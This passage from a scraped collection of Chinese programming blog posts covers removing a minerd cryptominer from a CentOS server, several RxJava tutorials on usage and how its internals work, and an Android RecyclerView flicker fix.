这个服务的，杀死minerd 进程后过大约5分钟左右minerd进程又出现了。 \n \n问题没有解决。 \n \n2、然后看到如下一个解决方法 \nhttp://www.cnblogs.com/zhouto/p/5680594.html \n（1）同1中的第一步 \n \n（2）chmod -x minerd  ,取消掉执行权限 \n \n \n（3）杀死进程 pkill minerd \n \n（4）然后运行一段时间发现minerd没有出现了 \n \n \n问题解决。 \n \n三：总结  \n因为我CentOS上安装了Redis，看网上说是黑客利用Redis的漏洞获得了服务器的访问权限。http://blog.jobbole.com/94518/", "time": "2018_08_14_11_13_10", "link": "https://blog.csdn.net/u013082989/article/details/51971121", "title": "服务器被入侵（minerd挖矿程序）"}
{"timestamp": "2018_08_14_11_13_10", "desc": "转载自:http://blog.csdn.net/u010498402/article/details/52275566 \n\n\n\n最近写了一个 图片多选下载的需求，\n\n\n\n类似这样，长按图片，或点击下载，变成下面的样式\n\n\n\n\n这个效果肯定是recyclerView  notifyDataSetChanged去改变状态，但是如果不处理 图片会重新加载，\n首先想到的解决方案是给viewholder的imageView设置tag，像这样\n\n\n\nif (!img.getLittle().equals(holder.imageView.getTag())) {\n    holder.imageView.setTag(img.getLittle());\n    ImageLoader.getInstance().displayImage(img.getLittle(), holder.imageView);\n}\n\n\n\n\n\n但是，如果只是这样的话，还是会重新加载图片，跟了很久代码之后，发现ViewHolder只保留了四个，具体原因 还不清楚，\n但是设置了adapter的setHasStableIds为true时，就可以了。\n\nmAdapter.setHasStableIds(true);\n\n\n\n看一下setHasStableIds的源码注释就可以看出来，这样设置之后，每一个item都会有一个独特的标识。", "time": "2018_08_14_11_13_10", "link": "https://blog.csdn.net/lj402159806/article/details/53691972", "title": "RecyclerView notifyDataSetChanged 图片闪烁的问题"}
{"timestamp": "2018_08_14_11_13_10", "desc": "RxJava学习\n本文使用eclipse编辑器，gradle依赖jar，如若未配置此环境，请转Java Eclipse配置gradle编译项目配置好环境后再查看此文\n创建Gradle(STS) Project工程，并删除其他一些不需要的文件。\n\n截图1.png\n\n在build.gradle文件的dependencies中依赖,并刷新依赖。compile \"io.reactivex.rxjava2:rxjava:2.1.3\"\n创建一个Client.java类，实现main方法。接下来开始使用RxJava。\n创建一个simple方法，该方法简单的使用RxJava.\n    /**\n     * 简单使用\n     */\n    public static void simple() {\n        Flowable//流\n        .just(\"one\") //数据\n        .subscribe(new Consumer<String>() {//订阅一个消费者\n\n            public void accept(String t) throws Exception {\n                System.out.println(t); // 打印数据              \n            }\n        });\n    }\n\n输出为：\none\n\n不同线程的调度，切换线程，不同线程中传递数据。\n    /**\n     * 线程示例\n     * @throws InterruptedException \n     */\n    public static void threadSimple() throws InterruptedException {\n        Flowable//流\n        .fromCallable(new Callable<String>() {//子线程调用\n            public String call() throws Exception {\n                System.out.println(Thread.currentThread().getName());\n                Thread.sleep(1000);\n                return \"true\";\n            }\n        })\n        .subscribeOn(Schedulers.io())//io线程\n        .observeOn(Schedulers.single())//单线程\n        .subscribe(new Consumer<String>() {//主线程订阅\n\n            public void accept(String t) throws Exception {\n                System.out.println(Thread.currentThread().getName());\n                System.out.println(t);\n            }\n        }, new Consumer<Throwable>() {\n\n            public void accept(Throwable t) throws Exception {\n                System.out.println(t);\n            }\n        });\n        Thread.sleep(2000);\n    }\n\n打印结果：\nRxCachedThreadScheduler-1\nRxSingleScheduler-1\ntrue\n\n3.实现1-10数字的自乘。\n    /**\n     * map使用\n     */\n    public static void mapSimple() {\n        Flowable//流\n        .range(1, 10)//从1到10 \n        .observeOn(Schedulers.computation())//用于计算工作的实例     \n        .map(new Function<Integer, Integer>() {//对每一项进行自乘\n            public Integer apply(Integer t) throws Exception {\n                return t*t;\n            }\n        })\n        .blockingSubscribe(new Consumer<Integer>() {//当前线程回调\n\n            public void accept(Integer t) throws Exception {\n                System.out.println(t);\n            }\n        });\n    }\n\n打印结果：\n1\n4\n9\n16\n25\n36\n49\n64\n81\n100\n\n实现1-10自乘，乱序打印。\n    /**\n     * flatMap使用\n     */\n    public static void flatMapSimple() {\n        Flowable\n        .range(1, 10)\n        .flatMap(new Function<Integer, Publisher<? extends Integer>>() {\n\n            public Publisher<? extends Integer> apply(Integer t) throws Exception {\n                return Flowable\n                        .just(t)\n                        .subscribeOn(Schedulers.computation())\n                        .map(new Function<Integer, Integer>() {\n\n                            public Integer apply(Integer t) throws Exception {\n                                return t*t;\n                            }\n                        });\n            }\n        })\n        .blockingSubscribe(new Consumer<Integer>() {\n\n            public void accept(Integer t) throws Exception {\n                System.out.println(t);\n            }\n        });\n    }\n\n打印结果：\n9\n16\n25\n36\n49\n64\n1\n4\n81\n100\n\n从2.0.5开始，有一个“实验”操作符的并行和“平行流”，有助于实现相同的并行处理模式。\n    /**\n     * 平行调用map\n     */\n    public static void parallelSimple() {\n        Flowable\n        .range(1, 10)\n        .parallel()//平行\n        .runOn(Schedulers.computation())\n        .map(new Function<Integer, Integer>() {\n\n            public Integer apply(Integer t) throws Exception {\n                return t*t;\n            }\n        })\n        .sequential()//顺序\n        .blockingSubscribe(new Consumer<Integer>() {\n\n            public void accept(Integer t) throws Exception {\n                System.out.println(t);\n            }\n        });\n    }\n\n打印结果：\n1\n4\n9\n16\n25\n36\n49\n64\n81\n100\n\n代码下载", "time": "2018_08_14_11_13_10", "link": "https://blog.csdn.net/mazaiting/article/details/78129540", "title": "Java RxJava学习使用"}
{"timestamp": "2018_08_14_11_13_10", "desc": "本篇文章已授权微信公众号 guolin_blog （郭霖）独家发布\n\nRxJava是一个神奇的框架，用法很简单，但内部实现有点复杂，代码逻辑有点绕。我读源码时，确实有点似懂非懂的感觉。网上关于RxJava源码分析的文章，源码贴了一大堆，代码逻辑绕来绕去的，让人看得云里雾里的。既然用拆轮子的方式来分析源码比较难啃，不如换种方式，以造轮子的方式，将源码中与性能、兼容性、扩展性有关的代码剔除，留下核心代码带大家揭秘RxJava的实现原理。\n\n什么是响应式编程\n\n首先，我们需要明确，RxJava是Reactive Programming在Java中的一种实现。什么是响应式编程？ \n用一个字来概括就是流(Stream)。Stream 就是一个按时间排序的 Events 序列,它可以放射三种不同的 Events：(某种类型的)Value、Error 或者一个” Completed” Signal。通过分别为 Value、Error、”Completed”定义事件处理函数，我们将会异步地捕获这些 Events。基于观察者模式，事件流将从上往下，从订阅源传递到观察者。\n\n至于使用Rx框架的优点，它可以避免回调嵌套，更优雅地切换线程实现异步处理数据。配合一些操作符，可以让处理事件流的代码更加简洁，逻辑更加清晰。\n\n\n\n搭建大体的框架\n\n要造一座房子，首先要把大体的框架搭好。在RxJava里面，有两个必不可少的角色：Subscriber（观察者） 和 Observable（订阅源）。\n\n\n\nSubscriber（观察者）\n\nSubsribler在RxJava里面是一个抽象类，它实现了Observer接口。\n\n\n\npublic interface Observer<T> {\n    void onCompleted();\n    void onError(Throwable t);\n    void onNext(T var1);\n}\n\n为了尽可能的简单，将Subscriber简化如下：\n\n\n\npublic abstract class Subscriber<T> implements Observer<T> {\n    public void onStart() {\n    }\n}\n\n\n\nObservable（订阅源）\n\nObservable（订阅源）在RxJava里面是一个大而杂的类，拥有很多工厂方法和各式各样的操作符。每个Observable里面有一个OnSubscribe对象，只有一个方法（void call(Subscriber<? super T> subscriber);），用来产生数据流，这是典型的命令模式。\n\n\n\npublic class Observable<T> {\n    final OnSubscribe<T> onSubscribe;\n\n    private Observable(OnSubscribe<T> onSubscribe) {\n        this.onSubscribe = onSubscribe;\n    }\n\n    public static <T> Observable<T> create(OnSubscribe<T> onSubscribe) {\n        return new Observable<T>(onSubscribe);\n    }\n\n    public void subscribe(Subscriber<? super T> subscriber) {\n        subscriber.onStart();\n        onSubscribe.call(subscriber);\n    }\n\n    public interface OnSubscribe<T> {\n        void call(Subscriber<? super T> subscriber);\n    }\n}\n\n\n\n实践\n\n到此，一个小型的RxJava的雏形就出来了。不信？我们来实践一下吧。\n\n\n\n        Observable.create(new Observable.OnSubscribe<Integer>() {\n            @Override\n            public void call(Subscriber<? super Integer> subscriber) {\n                for (int i = 0; i < 10; i++) {\n                    subscriber.onNext(i);\n                }\n            }\n        }).subscribe(new Subscriber<Integer>() {\n            @Override\n            public void onCompleted() {\n\n            }\n            @Override\n            public void onError(Throwable t) {\n\n            }\n            @Override\n            public void onNext(Integer var1) {\n                System.out.println(var1);\n            }\n        });\n\n\n\n添加操作符\n\n其实，强大的RxJava的核心原理并没有想象中那么复杂和神秘，运用的就是典型的观察者模式。有了基本雏形之后，我们继续为这个框架添砖加瓦吧。RxJava之所以强大好用，与其拥有丰富灵活的操作符是分不开的。那么我们就试着为这个框架添加一个最常用的操作符：map。\n\n那么RxJava是如何实现操作符的呢？其实，每调用一次操作符的方法，就相当于在上层数据源和下层观察者之间桥接了一个新的Observable。桥接的Observable内部会实例化有新的OnSuscribe和Subscriber。OnSuscribe负责接受目标Subscriber传来的订阅请求，并调用源Observable.OnSubscribe的subscribe方法。源Observable.OnSubscribe将Event往下发送给桥接Observable.Subscriber，最终桥接Observable.Subscriber将Event做相应处理后转发给目标Subscriber。流程如下图所示：\n\n\n\n接着，我们用代码实现这一过程。在Observable类里面添加如下代码：\n\n\n\n    public <R> Observable<R> map(Transformer<? super T, ? extends R> transformer) {\n        return create(new OnSubscribe<R>() { // 生成一个桥接的Observable和 OnSubscribe\n            @Override\n            public void call(Subscriber<? super R> subscriber) {\n                Observable.this.subscribe(new Subscriber<T>() { // 订阅上层的Observable\n                    @Override\n                    public void onCompleted() {\n                        subscriber.onCompleted();\n                    }\n                    @Override\n                    public void onError(Throwable t) {\n                        subscriber.onError(t);\n                    }\n                    @Override\n                    public void onNext(T var1) {\n                        // 将上层的onSubscribe发送过来的Event，通过转换和处理，转发给目标的subscriber\n                        subscriber.onNext(transformer.call(var1));\n                    }\n                });\n            }\n        });\n    }\n    public interface Transformer<T, R> {\n        R call(T from);\n    }\n\nmap操作符的作用是将T类型的Event转化成R类型，转化策略抽象成Transformer<T, R>（RxJava中用的是Func1<T, R>，但为了便于理解，起了一个有意义的名字）这一个函数接口，由外部传入。\n\n上面代码中使用到一些泛型的通配符，有些地方使用了super，有些地方使用了extends，其实这是有讲究的，传给Transformer#call方法的参数是T类型的，那么call方法的参数类型可以声明成是T的父类，Transformer#call方法的返回值要求是R类型的，那么它的返回值类型应该声明成R的子类。如果大家不能理解，也可以不用在意这些细节。\n\n那么我们一起来测试一下吧。\n\n\n\n        Observable.create(new Observable.OnSubscribe<Integer>() {\n            @Override\n            public void call(Subscriber<? super Integer> subscriber) {\n                for (int i = 0; i < 10; i++) {\n                    subscriber.onNext(i);\n                }\n            }\n        }).map(new Observable.Transformer<Integer, String>() {\n            @Override\n            public String call(Integer from) {\n                return \"maping \" + from;\n            }\n        }).subscribe(new Subscriber<String>() {\n            @Override\n            public void onNext(String var1) {\n                System.out.println(var1);\n            }\n            @Override\n            public void onCompleted() {}\n            @Override\n            public void onError(Throwable t) {}\n        });\n\n但是，我们看到map()方法内内部类有点多，代码缺少拓展性和可读性，我们应该进行适当地重构，将主要的逻辑抽离成独立的模块，并保证模块间尽量解耦，否则Observable只会越来越臃肿。\n\n\n\n    public <R> Observable<R> map(Transformer<? super T, ? extends R> transformer) {\n        return create(new MapOnSubscribe<T, R>(this, transformer));\n    }\npublic class MapOnSubscribe<T, R> implements Observable.OnSubscribe<R> {\n    final Observable<T> source;\n    final Observable.Transformer<? super T, ? extends R> transformer;\n    public MapOnSubscribe(Observable<T> source, Observable.Transformer<? super T, ? extends R> transformer) {\n        this.source = source;\n        this.transformer = transformer;\n    }\n    @Override\n    public void call(Subscriber<? super R> subscriber) {\n        source.subscribe(new MapSubscriber<R, T>(subscriber, transformer));\n    }\n}\npublic class MapSubscriber<T, R> extends Subscriber<R> {\n    final Subscriber<? super T> actual;\n    final Observable.Transformer<? super R, ? extends T> transformer;\n    public MapSubscriber(Subscriber<? super T> actual, Observable.Transformer<? super R, ? extends T> transformer) {\n        this.actual = actual;\n        this.transformer = transformer;\n    }\n    @Override\n    public void onCompleted() {\n        actual.onCompleted();\n    }\n    @Override\n    public void onError(Throwable t) {\n        actual.onError(t);\n    }\n    @Override\n    public void onNext(R var1) {\n        actual.onNext(transformer.call(var1));\n    }\n}\n\n\n\n添加线程切换功能\n\nRxJava中最激动人心的功能是异步处理，能够自如地切换线程。利用 subscribeOn() 结合 observeOn() 来实现线程控制，让事件的产生和消费发生在不同的线程。 observeOn() 可以多次调用，实现了线程的多次切换，最终目标Subscriber的执行线程与最后一次observeOn()的调用有关。但subscribeOn() 多次调用只有第一个subscribeOn() 起作用。为什么呢？因为 observeOn() 作用的是Subscriber，而subscribeOn() 作用的是OnSubscribe。\n\n这里借用扔物线的图：\n\n\n\n简单地调用一个方法就可以完成线程的切换，很神奇对吧。RxJava是如何实现的呢？除了桥接Observable以外，RxJava还用到一个很关键的类—Scheduler（调度器）。文档中给Scheduler的定义是：A Scheduler is an object that schedules units of work.，也就是进行任务的调度的一个东西。Scheduler里面有一个重要的抽象方法：\n\n\n\n    public abstract Worker createWorker();\n\nWorker是Scheduler的内部类，它是具体任务的执行者。当要提交任务给Worker执行需要调用Worker的schedule(Action0 aciton)方法。\n\n\n\n        public abstract Subscription schedule(Action0 action);\n\n要获得一个Scheduler并不需要我们去new，一般是调用Schedulers的工厂方法。\n\n\n\npublic final class Schedulers {\n    private final Scheduler computationScheduler;\n    private final Scheduler ioScheduler;\n    private final Scheduler newThreadScheduler;\n    public static Scheduler io() {\n        return RxJavaHooks.onIOScheduler(getInstance().ioScheduler);\n    }\n    public static Scheduler computation() {\n        return RxJavaHooks.onComputationScheduler(getInstance().computationScheduler);\n    }\n  ...\n}\n\n具体的Scheduler的实现类就不带大家一起看了，但我们需要知道，能做到线程切换的关键Worker的schedule方法，因为它会把传过来的任务放入线程池，或新线程中执行，这取决于具体Scheduler的实现。\n\n\n\n自定义Scheduler\n\n那么，下面我们先来自定义一个简单的Scheduler和Worker。\n\n\n\npublic class Scheduler {\n    final Executor executor;\n    public Scheduler(Executor executor) {\n        this.executor = executor;\n    }\n    public Worker createWorker() {\n        return new Worker(executor);\n    }\n    public static class Worker {\n        final Executor executor;\n        public Worker(Executor executor) {\n            this.executor = executor;\n        }\n      // 这里接受的是Runnable而不是Action0，其实这没什么关系，主要是懒得自定义函数式接口了。\n        public void schedule(Runnable runnable) {\n            executor.execute(runnable);\n        }\n    }\n}\n\n为了达到高仿效果，我们也提供相应的工厂方法。\n\n\n\npublic class Schedulers {\n    private static final Scheduler ioScheduler = new Scheduler(Executors.newSingleThreadExecutor());\n    public static Scheduler io() {\n        return ioScheduler;\n    }\n}\n\n\n\n实现subscribeOn\n\nsubscribeOn是作用于上层OnSubscribe的，可以让OnSubscribe的call方法在新线程中执行。\n\n因此，在Observable类里面，添加如下代码：\n\n\n\n    public Observable<T> subscribeOn(Scheduler scheduler) {\n        return Observable.create(new OnSubscribe<T>() {\n            @Override\n            public void call(Subscriber<? super T> subscriber) {\n                subscriber.onStart();\n                // 将事件的生产切换到新的线程。\n                scheduler.createWorker().schedule(new Runnable() {\n                    @Override\n                    public void run() {\n                        Observable.this.onSubscribe.call(subscriber);\n                    }\n                });\n            }\n        });\n    }\n\n测试一下：\n\n\n\n        Observable.create(new Observable.OnSubscribe<Integer>() {\n            @Override\n            public void call(Subscriber<? super Integer> subscriber) {\n                System.out.println(\"OnSubscribe@ \"+Thread.currentThread().getName()); //new Thread\n                subscriber.onNext(1);\n            }})\n                .subscribeOn(Schedulers.io())\n                .subscribe(new Subscriber<Integer>() {\n                  ...\n                    @Override\n                    public void onNext(Integer var1) {\n                        System.out.println(\"Subscriber@ \"+Thread.currentThread().getName()); // new Thread\n                        System.out.println(var1);\n                    }\n                });\n\n\n\n实现observeOn\n\nsubscribeOn是作用于下层Subscriber的，需要让下层Subscriber的事件处理方法放到新线程中执行。\n\n为此，在Observable类里面，添加如下代码：\n\n\n\n    public Observable<T> observeOn(Scheduler scheduler) {\n        return Observable.create(new OnSubscribe<T>() {\n            @Override\n            public void call(Subscriber<? super T> subscriber) {\n                subscriber.onStart();\n                Scheduler.Worker worker = scheduler.createWorker();\n                Observable.this.onSubscribe.call(new Subscriber<T>() {\n                    @Override\n                    public void onCompleted() {\n                        worker.schedule(new Runnable() {\n                            @Override\n                            public void run() {\n                                subscriber.onCompleted();\n                            }\n                        });\n                    }\n                    @Override\n                    public void onError(Throwable t) {\n                        worker.schedule(new Runnable() {\n                            @Override\n                            public void run() {\n                                subscriber.onError(t);\n                            }\n                        });\n                    }\n                    @Override\n                    public void onNext(T var1) {\n                        worker.schedule(new Runnable() {\n                            @Override\n                            public void run() {\n                                subscriber.onNext(var1);\n                            }\n                        });\n                    }\n                });\n            }\n        });\n    }\n\n\n测试一下：\n\n\n\n        Observable.create(new Observable.OnSubscribe<Integer>() {\n            @Override\n            public void call(Subscriber<? super Integer> subscriber) {\n                System.out.println(\"OnSubscribe@ \" + Thread.currentThread().getName()); // main\n                subscriber.onNext(1);\n            }\n        })\n                .observeOn(Schedulers.io())\n                .subscribe(new Subscriber<Integer>() {\n                  ...\n                    @Override\n                    public void onNext(Integer var1) {\n                        System.out.println(\"Subscriber@ \" + Thread.currentThread().getName()); // new Thread\n                        System.out.println(var1);\n                    }\n                });\n\n\n\n在Android中切换线程\n\n经过以上实践，我们终于知道了RxJava线程切换的核心原理了。下面我们顺便来看看Android里面是如何进行线程切换的。\n\n首先找到AndroidSchedulers，发现一个Scheduler的具体实现类：LooperScheduler。\n\n\n\n    private AndroidSchedulers() {\n    ...\n            mainThreadScheduler = new LooperScheduler(Looper.getMainLooper());\n            ...\n    }\n    /** A {@link Scheduler} which executes actions on the Android UI thread. */\n    public static Scheduler mainThread() {\n        return getInstance().mainThreadScheduler;\n    }\n\nLooperScheduler的代码很清晰，内部持有一个Handler，用于线程的切换。在Worker的schedule(Action0 action,...)方法中，将action通过Handler切换到所绑定的线程中执行。\n\n\n\nclass LooperScheduler extends Scheduler {\n    private final Handler handler;\n\n    LooperScheduler(Looper looper) {\n        handler = new Handler(looper);\n    }\n\n    LooperScheduler(Handler handler) {\n        this.handler = handler;\n    }\n\n    @Override\n    public Worker createWorker() {\n        return new HandlerWorker(handler);\n    }\n\n    static class HandlerWorker extends Worker {\n        private final Handler handler;\n\n      ...\n\n        @Override\n        public Subscription schedule(Action0 action, long delayTime, TimeUnit unit) {\n        ...\n            action = hook.onSchedule(action);\n\n            ScheduledAction scheduledAction = new ScheduledAction(action, handler);\n\n            Message message = Message.obtain(handler, scheduledAction);\n            message.obj = this; // Used as token for unsubscription operation.\n\n            handler.sendMessageDelayed(message, unit.toMillis(delayTime));\n        ...\n            return scheduledAction;\n        }\n\n        @Override\n        public Subscription schedule(final Action0 action) {\n            return schedule(action, 0, TimeUnit.MILLISECONDS);\n        }\n    }\n\n    static final class ScheduledAction implements Runnable, Subscription {\n        private final Action0 action;\n        private final Handler handler;\n        private volatile boolean unsubscribed;\n      ...\n        @Override public void run() {\n            try {\n                action.call();\n            } ...\n        }\n        ...\n    }\n}\n\n\n\n结语\n\n就这样，以上用代码演示了RxJava一些核心功能是如何实现的，希望能给大家带来不一样的启发。但这只是一个小小的Demo，离真正能运用于工程的Rx框架还差太远。这也让我们明白到，一个健壮的框架，需要考虑太多东西，比如代码的可拓展性和可读性，性能优化，可测试性，兼容性，极端情况等等。但有时要想深入理解一个复杂框架的实现原理，就需要剥离这些细节代码，多关注主干的调用逻辑，化繁为简。\n\nDemo代码可到Github获取：https://github.com/TellH/RxJavaDemo/tree/master/src/my_rxjava\n\n\n\n参考&拓展\n\n\nhttps://mp.weixin.qq.com/s?__biz=MzI1MTA1MzM2Nw==&mid=2649796857&idx=1&sn=ed8325aeddac7fd2bd81a0717c010e98&scene=1&srcid=0817o3Xzkx4ILR6FKaR1M9LX#rd\nhttps://gank.io/post/560e15be2dca930e00da1083\nhttps://zhuanlan.zhihu.com/p/22338235", "time": "2018_08_14_11_13_10", "link": "https://blog.csdn.net/TellH/article/details/71534704", "title": "一起来造一个RxJava，揭秘RxJava的实现原理"}
{"timestamp": "2018_08_14_11_13_10", "desc": "前言\n\n\n  刚参加工作的时候接触到了项目中的Rxjava，当时一点基础没有，学习了好长时间才渐渐学会使用，但也只是皮毛，停留在表面。后来换工作了发现Rxjava对找工作的帮助还是挺大的，因为是流行框架，都可以讲给面试官听，体现出自己追求技术的精神。但实际上，学会Rxjava对技术的提升还是很有帮助的，所以我会为大家讲解Rxjava的相关知识，以及Rxjava 1 到Rxjava 2的变化，帮助大家能够学会使用Rxjava，并能在面试中征服面试官！ \n  本文的主要作用是：如果之前有点基础，那就是复习巩固，顺便了解一下新版本的Rxjava的变化；如果之前没有基础，那就来认识一下Rxjava,\n\n\n\n\nRxjava是什么？\n\nRxJava 在官网上的说明是：\n\n\n  a library for composing asynchronous and event-based programs using observable sequences for the Java VM  \n  一个在 Java VM上使用可观测的序列来组成异步的、基于事件的程序的库\n\n\n这句话很难懂，但是可以概括成一个核心词——异步\n\nRxjava主要作用就是用来处理异步，当你的业务需要访问数据库，访问网络，或者任何耗时的操作，都可以借助Rxjava来实现。 \n但是有人说在Android中已经有很多异步操作的API，比如Handler，AsyncTask等，这些都能满足基本的异步操作，为什么还要使用Rxjava呢？ \n首先我们开看一个例子做个比较：\n\n\n  假设有这样一个需求：界面上有一个自定义的视图 imageCollectorView ，它的作用是显示多张图片，并能使用 addImage(Bitmap) 方法来任意增加显示的图片。现在需要程序将一个给出的目录数组 File[] folders 中每个目录下的 png 图片都加载出来并显示在 imageCollectorView中。需要注意的是，由于读取图片的这一过程较为耗时，需要放在后台执行，而图片的显示则必须在 UI 线程执行。\n\n\n常用的实现方式有多种，比如： \n代码块1\n\n\n\n//采用android自带的api实现\nnew Thread() {\n    @Override\n    public void run() {\n        super.run();\n        for (File file : files) {\n            File[] files = folder.listFiles();\n            for (File file : files) {\n                if (file.getName().endsWith(\".png\")) {\n                    final Bitmap bitmap = getBitmapFromFile(file);\n                    getActivity().runOnUiThread(new Runnable() {\n                        @Override\n                        public void run() {\n                            imageCollectorView.addImage(bitmap);\n                        }\n                    });\n                }\n            }\n        }\n    }\n}.start();\n\n如果使用Rxjava，则可以这样实现： \n代码块2\n\n\n\n//采用Rxjava实现\nObservable.from(folders)\n    .flatMap(new Func1<File, Observable<File>>() {\n        @Override\n        public Observable<File> call(File file) {\n            return Observable.from(file.listFiles());\n        }\n    })\n    .filter(new Func1<File, Boolean>() {\n        @Override\n        public Boolean call(File file) {\n            return file.getName().endsWith(\".png\");\n        }\n    })\n    .map(new Func1<File, Bitmap>() {\n        @Override\n        public Bitmap call(File file) {\n            return getBitmapFromFile(file);\n        }\n    })\n    .subscribeOn(Schedulers.io())\n    .observeOn(AndroidSchedulers.mainThread())\n    .subscribe(new Action1<Bitmap>() {\n        @Override\n        public void call(Bitmap bitmap) {\n            imageCollectorView.addImage(bitmap);\n        }\n    });\n\n虽然代码块2的代码量比代码块1的代码量要多，但是很明显代码块2的代码看起来更整洁更优雅，而且如果读者学过Rxjava的人，会明显感觉到代码块2的可读性比代码块1的可读性要强。 \n由此可见Rxjava的优点即是：采用链式调用，代码简洁优雅有美感，并且可读性增强！\n\n以上，是Rxjava的一部分优点，其实Rxjava的优点更在于它的强大。\n\n\n\n下面我们简单了解一下Rxjava的原理：\n\nRxjava实现异步的方法是通过观察者模式实现的。\n\n什么事观察者模式呢？\n\n\n  举个例子，用户界面可以作为一个观察者，业务数据是被观察者，用户界面观察业务数据的变化，发现数据变化后，就显示在界面上。\n\n\n在Android中最常见的观察者模式是View的onClick事件模型。 \n\n\n如图可见，当Button持有OnClickListener对象之后，Button被点击之后会自动触发OnClickListener中的OnClick方法。 \n把上面的Button点击事件抽象一下就变成： \n \n当Observable(可观察的，被观察者)的状态发生变化时，内部会通过一系列事件触发Observer(观察者)中的方法，可以做出相应的操作。 \n可能这样讲还是比较抽象，举个简单的生活中的例子：\n\n\n\n以上模型中，上课铃声是被观察者，即Observable，可观察的，被观察者；学生就是观察者，即Observer（观察者）,学生听到上课铃声响了，就会去上课，这就是学生根据上课铃声所做出的反应。 \n也就是：  \n被观察者状态发生变化，观察者可以做出反应。\n\n\n\n在Rxjava中观察者模式\n\nRxJava 有四个基本概念：Observable (可观察者，即被观察者)、 Observer (观察者)、 subscribe (订阅)、事件。Observable 和 Observer 通过 subscribe() 方法实现订阅关系，从而 Observable 可以根据情况回调来通知 Observer。 \nRxjava常用的的回调方法有三种： \n- onNext：完成队列中的一个事件 \n- onComplete：完成队列中所有的事件 \n- onError：事件发生错误时，并且后续的事件终止。\n\n\n\n为什么Rxjava要使用观察者模式呢？ \n因为观察者模式在模块之间划定了清晰的界限，降低模块耦合性，提高了代码的可维护性和重用性。\n\n\n\nRxjava基本使用方法\n\n\n创建Observer  \nObserver是观察者，当被观察者状态发生变化的时候，他会收到相应的事件，使用者可以根据不同的事件进行不同的处理。\n\n\n\n\nObserver<String> observer = new Observer<String>() {\n            @Override\n            public void onCompleted() {\n                Log.d(\"Rxjava demo\", \"onCompleted\");\n            }\n\n            @Override\n            public void onError(Throwable e) {\n                Log.d(\"Rxjava demo\", \"onError\");\n            }\n\n            @Override\n            public void onNext(String s) {\n                Log.d(\"Rxjava demo\", \"onNext\");\n            }\n        };\n\n其实，除了使用Observer以外，Rxjava还有个Subscriber。这个是实现了Observer的抽象类，里面对Observer进行了一些扩展。\n\n\n\n Subscriber<String> subscriber = new Subscriber<String>() {\n\n            @Override\n            public void onStart() {\n                super.onStart();\n            }\n\n            @Override\n            public void onNext(String s) {\n                Log.d(\"Rxjava demo\", \"Item: \" + s);\n            }\n\n            @Override\n            public void onCompleted() {\n                Log.d(\"Rxjava demo\", \"Completed!\");\n            }\n\n            @Override\n            public void onError(Throwable e) {\n                Log.d(\"Rxjava demo\", \"Error!\");\n            }\n        };\n\n可以看出，Subscriber比Observer多了一个回调方法onStart()，它会在事件开始执行之前的时候调用，用于做一些准备工作，类似于AsyncTask中的onPreExecute方法。 \n但是subscriber中还有几个很重要的方法： \n- unsubscribe()：这个方法是取消订阅事件，一般有利于防止内存泄漏。在android开发中我们知道一般有订阅就应该有取消订阅。 \n- isUnsubscribed()：这个方法是用于判断事件是否被订阅。 \n- add(Subscription s)：这个方法是把一个Subscription 添加到Subscription列表中，便于统一管理，取消订阅等 \n2. 创建Observable\n\n\n\nObservable observable = Observable.create(new Observable.OnSubscribe<String>() {\n            @Override\n            public void call(Subscriber<? super String> subscriber) {\n                subscriber.onNext(\"onNext\");\n                subscriber.onCompleted();\n                subscriber.onNext(\"onNext\");\n                subscriber.onError(new Throwable());\n            }\n        });\n\n使用create方法创建Observable（被观察者），然后call方法会被自动调用，在call方法内部定义事件的回调的行为。 \n其实这段代码中，当执行了onComplete方法之后，就不会在往下执行了，也就是说onError方法不会被调用，因为事件已经完全执行完成，就会停止执行之后的事件。 \n如果我们反过来写：\n\n\n\nObservable observable = Observable.create(new Observable.OnSubscribe<String>() {\n            @Override\n            public void call(Subscriber<? super String> subscriber) {\n                subscriber.onNext(\"onNext\");\n                subscriber.onError(new Throwable());\n                subscriber.onCompleted();\n                subscriber.onNext(\"onNext\");\n            }\n        });\n\nonNext方法执行完成之后会执行onError，但是之后的onComplete方法以及后面的事件都不会在执行了，前面我们说过，onError执行之后表示事件执行失败，后面的事件就会停止执行。 \n3. Subscribe(订阅)\n\n\n\nobservable.subscribe(observer);\n\n最后我们使用subscribe方法让observer订阅observable。但是这个方法看起来写反了，他不是“观察者”订阅“被观察者”，而是被观察者订阅了观察者，这其实是因为为了保证流式的设计，把subscribe是Observable的方法，把observer作为参数传进。 \n什么保证流式设计呢？ \n因为Rxjava可以这样写：\n\n\n\nObservable.create(new Observable.OnSubscribe<String>() {\n            @Override\n            public void call(Subscriber<? super String> subscriber) {\n                subscriber.onNext(\"onNext\");\n                subscriber.onCompleted();\n                subscriber.onError(new Throwable());\n            }\n        }).subscribe(new Observer<String>() {\n            @Override\n            public void onCompleted() {\n                Log.d(\"Rxjava demo\", \"onCompleted\");\n            }\n\n            @Override\n            public void onError(Throwable e) {\n                Log.d(\"Rxjava demo\", \"onError\");\n            }\n\n            @Override\n            public void onNext(String s) {\n                Log.d(\"Rxjava demo\", \"onNext\");\n            }\n        });\n\n这样代码就会看着优雅许多，而且层级清晰，可读性强。 \n通过以上方法，我们就简单了解了Rxjava的使用方法。但其实，Observable的创建方式有多种: \n- 例如just可以传入多个参数，最多可以传入10个参数，并且会自动调用10次onNext \n- from(T[])将传入的数组依次发送出去，数组内有多少个元素，就会调用多少次onNext，当所有元素（事件）发送结束之后会调用onComplete，如果在某个元素中发生错误，就会调用onError。 \n写法如下：\n\n\n\nArrayList<String> array = new ArrayList<>();\nObservable.from(array).subscribe(new Subscriber<String>() {\n            @Override\n            public void onCompleted() {\n\n            }\n\n            @Override\n            public void onError(Throwable e) {\n\n            }\n\n            @Override\n            public void onNext(String s) {\n\n            }\n        });\n\n大家可以看到，不用再重写call方法，因为会自动安排事件发送，不需要手动调用onNext等方法了，而这段代码中的onNext方法会依次输出数组中的每一个元素。\n\n\n\nRxjava的变化\n\n以上内容都是基于Rxjava比较旧的API介绍的，目前Rxjava 1 已经更新到了1.3 \n使用最新的Rxjava 1需要引入以下依赖：\n\n\n\ncompile 'io.reactivex:rxjava:1.3.0'\ncompile 'io.reactivex:rxandroid:1.2.1'\n\n在这个版本中的Observable的创建有所变化,方法 static  Observable create(OnSubscribe f)已经过时了，因为这个方法不安全。 \n新的版本中已经引入了比较安全的方法： \n- static \n\n Observable.create(new SyncOnSubscribe<String, String>() {\n            @Override\n            protected String generateState() {\n                Log.d(\"Rxjava demo\", \"generateState\");\n                return \"generateState\";\n            }\n\n            @Override\n            protected String next(String state, Observer<? super String> observer) {\n                